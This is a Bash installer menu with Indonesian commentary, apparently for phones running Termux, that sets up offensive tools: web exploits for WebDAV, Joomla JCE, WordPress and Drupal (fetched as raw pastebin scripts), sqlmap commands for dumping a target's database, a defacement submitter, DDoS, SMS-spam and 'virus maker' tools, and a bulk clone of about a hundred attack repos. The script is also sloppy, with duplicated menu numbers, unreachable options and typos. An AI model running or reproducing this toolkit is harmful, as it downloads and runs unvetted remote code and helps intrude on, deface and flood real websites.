#!/bin/xbin/bash
#Tools Installer PestaTools
#Copyright By Codename
#Coder By Codename
clear      
 
B='\e[0;34'
C='\[0;36m'
G='\e[0;34m'
Ok='\033[92m'
LG='\e[1;32m'
W='\e[1;37m'
R='\e[1;31m'
 
 
   
###################################################
# CTRL C
###################################################
 
trap ctrl_c INT
 
ctrl_c() {
    clear
    echo "\033[31;1m(Ctrl + C ) Detected, Trying To Exit ... "
    sleep 1
    echo ""
    echo "\033[37;1m#>Thanks Stah Telah Bersedia Pakai Tools Saya Yang Sederhana Ini "
    sleep 1
    echo ""
    echo "\033[37;1m#>Jangan Lupa Mampir Lagi Yah Stah"
    read enter
    exit
}


echo "\033[31;1m__________                 __       ___________           .__          "
echo "\033[31;1m\______   \ ____   _______/  |______\__    ___/___   ____ |  |   ______"
echo "\033[31;1m |     ___// __ \ /  ___/\   __\__  \ |    | /  _ \ /  _ \|  |  /  ___/"
echo "\033[31;1m |    |   \  ___/ \___ \  |  |  / __ \|    |(  <_> |  <_> )  |__\___ \ "
echo "\033[31;1m |____|    \___  >____  > |__| (____  /____| \____/ \____/|____/____  >"
echo ""
echo "\033[31;1m##==================================================>"      
echo "\033[37;1mNotice : Pembuat Jomblo.Kali Aja Ada Yang Tertarik"
echo "\033[31;1m##==================================================>"   
echo "\033[37;1mMenu Installer Tools Variant" 
echo "\033[31;1m##==================================================>"
echo "\033[37;1m{1} Ko-Dork" 
echo "\033[31;1m##==================================================>"
echo "\033[37;1m{2} admin-finder blazing fast" 
echo "\033[31;1m##==================================================>"
echo "\033[37;1m{3} webdav" 
echo "\033[31;1m##==================================================>"
echo "\033[37;1m{4} webdav exploit" 
echo "\033[31;1m##==================================================>" 
echo "\033[37;1m{5} Sqlmap" 
echo "\033[31;1m##==================================================>"
echo "\033[37;1m{6} webdav php auto exploiter" 
echo "\033[31;1m##==================================================>"
echo "\033[37;1m{7} exploit jce" 
echo "\033[31;1m##==================================================>"
echo "\033[37;1m{8} simpel-exploit-wordpress" 
echo "\033[31;1m##==================================================>"
echo "\033[37;1m{9} WPSeku" 
echo "\033[31;1m##==================================================>"
echo "\033[37;1m{10} ZoneH " 
echo "\033[31;1m##==================================================>"
echo "\033[37;1m{11} Mass Drupal "
echo "\033[31;1m##==================================================>" 
echo "\033[37;1m{12} Tiket.com SMS "
echo "\033[31;1m##==================================================>" 
echo "\033[37;1m{13} SPAM JD.ID Code "
echo "\033[31;1m##==================================================>" 
echo "\033[37;1m{14} Auto Install 60Tools Hacking "
echo "\033[31;1m##==================================================>"
echo "\033[37;1m{15} Ddos "
echo "\033[31;1m##==================================================>"
echo "\033[37;1m{16} Virus Maker  "
echo "\033[31;1m##==================================================>"
echo "\033[37;1m{X} Installing Module Perl"
echo "\033[31;1m##==================================================>"
echo "\033[37;1m[0] Exit " 
echo "\033[31;1m##==================================================>"    
read -p "root@pesta ~#" code

if [ $code = 1 ] || [ $code = 1 ]
then														
clear
echo " Installing ko-dork"
sleep 1
toilet -f standard --gay 'Siwanna'
apt update && apt upgrade
apt install git
apt install python2
git clone https://github.com/CiKu370/ko-dork.git
mv ko-dork/ $HOME
echo " Done Sudah Terinstall Stah "
echo " Notice : Dork Sql Work "
fi

if [ $code = 2 ] || [ $code = 02 ]
then
clear
echo " Install admin-finder"
sleep 1
toilet -f standard --gay 'Siwanna'
apt update && apt upgrade
apt install python2
apt install git
git clone https://github.com/the-c0d3r/admin-finder.git
mv admin-finder/ $HOME
echo " Done Sudah Terinstall Stah "
fi

if [ $code = 3 ] || [ $code = 03 ]
then
clear
echo " installing webdav"
sleep 1
toilet -f standard --gay 'Siwanna'
apt update && upgrade
apt install python2
pip2 install urllib3 chardet certifi idna requests
apt install openssl curl
pkg install curl
mkdir webdav
cd ~/webdav
curl https://pastebin.com/raw/HnVyQPtR -o webdav.py
cd ~/
mv webdav.py $HOME
echo " Done Sudah Terinstall Stah "
fi

if [ $code = 4 ] || [ $code = 04 ]
then
clear
echo " installing webdav exploit"
sleep 1
toilet -f standard --gay 'Siwanna'
apt update && apt upgrade
apt install python2
apt install git
pip2 install request
git clone https://github.com/amrelsadane123/exploit-WebDav-
mv exploit-WebDav-/ $HOME
echo " Done Sudah Terinstall Stah "
fi

if [ $code = 5 ] || [ $code = 05 ]
then
clear
echo " Installing Sqlmap"
sleep 1
toilet -f standard --gay "Siwanna"
apt update && upgrade
apt install git
apt install python2
git clone https://github.com/sqlmapproject/sqlmap.git
mv sqlmap/ $HOME
echo " Done Sudah Terinstall Stah "
echo " Usage : python2 sqlmap.py -u https://targets.com/product?=1 --dbs "
echo " Usage : python2 sqlmap.py -u https://targets.com/product?=1 -D nama database --tables "
echo " Usage : python2 sqlmap.py -u https://target.com/product?=1 -D nama database -T nama tables --columns "
echo " Usage : python2 sqlmap.py -u https://target.com/product?=1 -D nama Database -T nama tables -C nama column --dump "
fi

if [ $code = 6 ] || [ $code = 06 ]
then
clear
echo " Installing webdav php auto exploiter"
sleep 1
toilet -f standard --gay 'Siwanna'
apt update && apt upgrade
apt install php
pkg install php-apache
pkg install php-dev
pkg install php-fpm
pkg install php-pgsql
pkg install curl
curl https://pastebin.com/raw/EJb57wzm -o webdav.php
mv webdav.php/ $HOME 
echo " Done Sudah Terinstall Stah "
fi

if [ $code = 7 ] || [ $code = 07 ]
then
clear
echoo " Installing exploit jce"
sleep 1
toilet -f standard --gay "Siwanna"
apt update && apt upgrade
apt install git
apt install wget
apt install php
mkdir com_fabrik
git clone https://github.com/amrelsadane123/exploit-jce
mv exploit-jce/ $HOME
echo " Done Sudah Terinstall Stah "
fi

if [ $code = 8 ] || [ $code = 08 ]
then
clear
echo " Installing simpel-exploit-wordpress"
sleep 1
toilet -f standard --gay "Siwanna"
apt update && apt upgrade
apt install wget
apt install python2
apt install nano
apt install php
apt install git
git clone https://github.com/9nasghost/simpel-exploit-wordpress.git
mv simpel-exploit-wordpress/ $HOME
echo " Done Sudah Terinstall Stah "
fi

if [ $code = 9 ] || [ $code = 09 ]
then
clear
echo " Installing WPSeku"
sleep 1
toilet -f standard --gay "Siwanna"
apt update && apt upgrade
apt install python
git clone https://github.com/m4ll0k/WPSeku.git 
cd ~/wpseku
pip3 install -r requirements.txt
cd ~/
mv WPSeku/ $HOME
echo " Done Sudah Terinstall Stah "
fi

if [ $code = 10 ] || [ $code = 10 ]
then
clear
echo " installing ZoneH "
sleep 1
toilet -f standard --gay "Siwanna"
apt update && apt upgrade
apt install php
apt install wget
mkdir Zone-H
cd ~/Zone-H
wget https://pastebin.com/raw/zNhnyLYL -o ZoneH.php
cd ~/
mv Zone-H/ $HOME
echo " Done Sudah Terinstall Stah "
echo " Notice : Buatlah Sebuah File source list.txt pada memory dan isi dengan url bekas defacemu "
echo " Demo : /storage/emulated/0/list.txt "
fi

if [ $code = 11 ] || [ $code = 11 ]
then
clear
echo "Installing Mass Drupal RCE"
sleep 1
apt update && apt upgrade
pkg install wget
wget https://pastebin.com/raw/M0cCyaB7 -O rce.sh
chmod +x rce.sh
mv rce.sh $HOME
echo "Done Install This Tools"
echo "Now You Can Run This Tools With Command $./rce.sh list.txt"
echo "if (/bin/sh^M: bad interpreter)to fix write this command"
echo "$sed -i 's/\r//' rce.sh"
fi

if [ $code = 12 ] || [ $code = 12 ]
then
clear
echo "Installing TIKET.COM"
sleep 1
apt update && apt upgrade
apt install php
php tiket.php
fi

if [ $code = 13 ] || [ $code = 13 ]
then
clear
echo "Installing SPAM JD.ID Code"
sleep 1
apt update && apt upgrade
apt install php
php jdid.php
fi

if [ $code = 14 ] || [ $code = 14 ]
then
clear
echo "Installing Tools Hacking"
sleep 1
apt update && apt upgrade
apt install php
apt install python2
apt install git
git clone https://github.com/Tuhinshubhra/RED_HAWK
git clone https://github.com/shawarkhanethicalhacker/D-TECT
git clone https://github.com/rfunix/Pompem
git clone https://github.com/UltimateHackers/ReconDog
git clone https://github.com/1N3/XSSTracer
git clone https://github.com/deibit/cansina
git clone https://github.com/v3n0m-Scanner/V3n0M-Scanner
git clone https://github.com/Spaddex/Admin-Finder
git clone https://github.com/sqlmapproject/sqlmap.git
git clone https://github.com/frdmn/findmyhash
git clone https://github.com/DanMcInerney/shellshock-hunter
git clone https://github.com/DanMcInerney/shellshock-hunter-google
git clone https://github.com/DanMcInerney/wifijammer
git clone https://github.com/darkoperator/dnsrecon
git clone https://github.com/ddos-defense/bohatei
git clone https://github.com/desaster/kippo
git clone https://github.com/devttys0/binwalk
git clone https://github.com/digininja/CeWL
git clone https://github.com/Dionach/CMSmap
git clone https://github.com/dloss/python-pentest-tools
git clone https://github.com/DoddyHackman/Arsenal_X
git clone https://github.com/DominikSchlecht/pyDirBuster
git clone https://github.com/dotfighter/torshammer
git clone https://github.com/dripcap/dripcap
git clone https://github.com/EgeBalci/The-Eye
git clone https://github.com/EnableSecurity/wafw00f
git clone https://github.com/endgameinc/binarypig
git clone https://github.com/epinna/weevely3
git clone https://github.com/Ettercap/ettercap
git clone https://github.com/evilsocket/bettercap
git clone https://github.com/ex0dus-0x/brut3k1t
git clone https://github.com/ex0dus-0x/dedsploit
git clone https://github.com/fgeek/pyfiscan
git clone https://github.com/foospidy/HoneyPy
git clone https://github.com/frdmn/findmyhash
git clone https://github.com/g0tmi1k/mpc
git clone https://github.com/gabrielrcouto/reaver-wps
git clone https://github.com/mempodippy/vlany.git
git clone https://github.com/unix-thrust/beurk.git
git clone https://github.com/nmap/nmap.git
git clone https://github.com/leviathan-framework/leviathan.git
git clone https://github.com/n1nj4sec/pupy/tree/master/client
git clone https://github.com/valyala/goloris.git
git clone https://github.com/radare/radare2.git
git clone https://github.com/OffensivePython/Saddam.git
git clone https://github.com/botherder/virustotal.git
git clone https://github.com/Microsoft/binskim.git
git clone https://github.com/0xd4d/dnSpy.git
git clone https://github.com/lowleveldesign/wtrace.git
git clone https://github.com/spesmilo/electrum.git
git clone https://github.com/bitcoin-wallet/bitcoin-wallet.git
git clone https://github.com/tuxotron/xvwa_lamp_container.git
git clone https://github.com/JonathanSalwan/Triton.git
git clone https://github.com/hypsurus/weeman.git
git clone https://github.com/krmaxwell/tinfoleak
git clone https://github.com/secretsquirrel/fido.git
git clone https://github.com/gentilkiwi/mimikatz.git
git clone https://github.com/SecurityInnovation/AuthMatrix.git
git clone https://github.com/akheron/jansson
git clone https://github.com/wolf9466/cpuminer-multi.git
git clone https://github.com/tsiv/ccminer-cryptonight.git
git clone https://github.com/evilsocket/bettercap-proxy-modules.git
git clone https://github.com/Raikia/FiercePhish.git
git clone https://github.com/adaptivethreat/Empire.git
git clone https://github.com/gophish/gophish.git
git clone https://github.com/DhavalKapil/icmptunnel.git
git clone https://github.com/sqlmapproject/sqlmap.git
git clone https://github.com/davidpepper/fierce-domain-scanner.git
git clone https://github.com/Mebus/cupp.git
git clone https://github.com/digininja/CeWL.git
git clone https://github.com/iagox86/dnscat2.git
git clone https://github.com/ryhanson/phishery.git
git clone https://github.com/JusticeRage/Manalyze.git
git clone git://git.kali.org/packages/exploitdb.git
git clone https://github.com/trustedsec/social-engineer-toolkit.git
git clone https://github.com/roobixx/cowpatty.git
git clone https://github.com/hashcat/hashcat.git
git clone https://github.com/laramies/theHarvester.git
git clone https://github.com/secretsquirrel/the-backdoor-factory.git
git clone https://github.com/EnableSecurity/wafw00f.git
git clone https://github.com/stephenfewer/ReflectiveDLLInjection.git
git clone https://github.com/kstaken/dockerfile-examples.git
git clone https://github.com/xmendez/wfuzz.git
git clone https://github.com/pxb1988/dex2jar.git
git clone git://git.kali.org/packages/dirbuster.git
git clone https://github.com/deltaxflux/fluxion.git
git clone git://git.kali.org/packages/joomscan.git
git clone https://github.com/hexploitable/MEMSCAN.git
git clone https://github.com/hiddenillusion/AnalyzePDF.git
git clone https://github.com/smalot/pdfparser.git
git clone https://github.com/jesparza/peepdf.git
git clone https://github.com/reverse-shell/routersploit.git
git clone https://github.com/google/sandbox-attacksurface-analysis-tools.git
git clone https://github.com/sophron/wifiphisher.git
git clone https://github.com/wpscanteam/wpscan.git
git clone https://github.com/Yara-Rules/rules.git
git clone git://github.com/cuckoosandbox/cuckoo.git
git clone https://github.com/juansacco/exploitpack.git
git clone https://github.com/BlackArch/webshells.git
git clone https://github.com/EgeBalci/HERCULES.git
git clone https://github.com/EgeBalci/Cminer.git
git clone https://github.com/EgeBalci/The-Eye.git
git clone https://github.com/DanMcInerney/wifijamm
fi

if [ $code = 14 ] || [ $code = 14 ]
then
clear
echo "Installing Ddos"
sleep 1
apt update && apt upgrade
pkg install perl
pkg install make
pgk install clang
perl DDoS.pl 
fi

if [ $code = 15 ] || [ $code = 15 ]
then
clear
echo "Installing Admin Finder"
sleep 1
apt update && apt upgrade
pkg install perl
pkg install make
pgk install clang
cpan install HTTP::Request
cpan install LWP::UserAgent
perl admin_finder.pl
fi

if [ $code = 16 ] || [ $code = 16 ]
then
clear
echo "Installing Virus Maker "
sleep 1
apt update && apt upgrade
apt install python2
python2 anvima.py
fi

if [ $code = 17 ] || [ $code = 17 ]
then
clear
echo "Installing Admin Finder"
sleep 1
apt update && apt upgrade
apt install python2
python2 vbugmap.py
fi

if [ $code = X ] || [ $code = X ]
then
clear
echo " installing Module Perl "
sleep 1
apt install autoconf bison clang coreutils curl findutils git apr apr-util libffi-dev libgmp-dev libpcap-dev postgresql-dev readline-dev libsqlite-dev openssl-dev libtool libxml2-dev libxslt-dev ncurses-dev pkg-config wget make ruby-dev libgrpc-dev ncurses-utils termux-tools
pkg install -y perl make
wget http://search.cpan.org/CPAN/authors/id/O/OA/OALDERS/HTTP-Message-6.14.tar.gz
tar zxf HTTP-Message-6.14.tar.gz
cd HTTP-Message-6.14/
perl Makefile.PL
make
make test
make install
wget http://search.cpan.org/CPAN/authors/id/E/ET/ETHER/libwww-perl-6.31.tar.gz
tar zxf libwww-perl-6.31.tar.gz
cd libwww-perl-6.31/
perl Makefile.PL
make
make test
make install
cpan install Getopt::Long
cpan install HTTP::Request
cpan install Bundle::LWP 
cpan install LWP::UserAgent
cpan install IO::Select
cpan install HTTP::Cookies
cpan install HTTP::Response
cpan install Term::ANSIColor
cpan install URI::URL
cpan install IO::Socket::INET
cpan install Try::Tiny
echo "[✔] All is done! [✔]"
echo "[✔] Now You can run this module [✔]"
echo " done install module perl"
fi


if [ $code = 0 ] || [ $code = 0 ]
then
echo " Otaku Berpesan :) "
sleep 1
echo " Dear Jomblo ;* "
sleep 1
echo " Jangan Sange Sama 2Dimensi :p "
sleep 1
echo " Tutorial "
sleep 1
echo " Website : NostalgiaXploit.Wordpress.com "
sleep 1
echo " Blogger : cruznos.blogspot.com "
sleep 1
echo " Bye Para Jomble :p "
sleep 1
exit
fi
